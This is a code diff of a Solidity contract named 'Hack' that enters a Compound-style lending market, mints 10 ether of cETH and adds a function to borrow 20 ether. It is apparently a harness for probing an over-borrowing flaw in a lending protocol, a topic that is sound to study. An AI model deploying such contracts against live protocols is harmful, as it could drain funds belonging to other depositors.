@@ -7,9 +7,11 @@ import './Comptroller.sol';
 contract Hack {
     address comptroller;
     address cether;
-    constructor(address _comptroller, address _cether) public {
+    address payable _cether;
+    constructor(address _comptroller, address __cether) public {
         comptroller = _comptroller;
-        cether = _cether;
+        cether = __cether;
+        _cether = address(uint160(cether));
     }
     function enterMarket() public {
         address[] memory markets = new address[](1);
@@ -18,15 +20,18 @@ contract Hack {
         Comptroller(comptroller).enterMarkets(markets);
     }
 
-    function callMint(address payable _cether) public {
+    function callMint() public {
         //CEther(_cether).mint.value(10 ether);
         (bool success, )= _cether.call.value(10 ether)(abi.encodeWithSignature('mint()'));
         require(success, 'mint failed');
     }
 
     function getCEthBalance() public view returns(uint256){
-        address payable _cether = address(uint160(cether));
         return CEther(_cether).balanceOf(address(this));
+    }
+
+    function callBorrow() public {
+        CEther(_cether).borrow(20 ether);
     }   
 
     function() external payable{}
